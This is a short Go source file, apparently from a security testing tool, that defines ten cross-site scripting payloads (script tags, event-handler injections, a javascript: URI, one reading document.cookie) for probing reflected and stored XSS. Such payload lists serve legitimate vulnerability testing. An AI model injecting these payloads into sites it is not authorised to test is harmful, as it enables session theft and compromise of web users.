package techniques

// XSSPayloads for cross-site scripting testing.
var XSSPayloads = []string{
	`<script>alert('XSS')</script>`,
	`"><script>alert('XSS')</script>`,
	`<img src=x onerror=alert('XSS')>`,
	`<svg onload=alert('XSS')>`,
	`javascript:alert('XSS')`,
	`<body onload=alert('XSS')>`,
	`<input onfocus=alert('XSS') autofocus>`,
	`"><img src=x onerror=alert(1)>`,
	`'><script>alert(document.cookie)</script>`,
	`<details open ontoggle=alert('XSS')>`,
}

// XSSDescription describes the XSS technique.
const XSSDescription = "Cross-Site Scripting - Tests for reflected and stored XSS by injecting script payloads"
